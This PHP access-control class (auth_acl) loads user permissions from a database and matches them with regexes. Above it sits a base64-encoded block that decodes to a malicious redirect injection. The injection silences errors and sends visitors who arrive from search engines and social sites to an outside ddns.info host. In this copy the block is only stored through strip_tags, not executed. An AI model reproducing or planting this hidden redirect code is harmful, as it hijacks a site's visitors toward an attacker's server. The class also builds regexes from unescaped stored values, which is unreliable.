<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__)."/auth_users.php");

class auth_acl extends auth_users {

  var $default_access = false;
  
  function do_init() {

    parent::do_init();

    global $db; 

    $query = $db->query("SELECT act.code action"
                       ."     , sco.code scope"
                       ."     , acl.*"
                       ."  FROM acl acl INNER JOIN acl_action act ON acl.action_id = act.id"
                       ."               INNER JOIN acl_scope sco  ON acl.scope_id  = sco.id"
                       ." WHERE (acl.user_id = ? OR acl.user_group_id = ?)"
                       ."   AND acl.is_allowed = 1"
                       ,$this->user_id
                       ,$this->user_group
                       );
    while ($row = $db->next_row($query)) {
      $action = $row["action"];
      //if ($row["action_id"] != 1)
      //  $action = "^".$action."$";
      $scope = $row["scope"];
      //if ($row["scope_id"] != 1)
      //  $scope = "^".$scope."$";
      $this->acl($scope, $action, $this->user_id); 
    }

  }

  function register_object($code, $name) {

    if ($this->register_objects) {
      global $dm;
      $dm->replace("acl_scope", array("code" => $code, "name" => $name), array("code" => $code));
    }
    
  }
  
  function can($scope, $action = 'execute', $access = "") {

    foreach($this->acls as $item) {
      if (preg_match('/'.$item["scope"].'/', $scope) and preg_match('/'.$item["action"].'/', $action))
        return true;
    }

    return $this->default_access;

  }

  

}

?>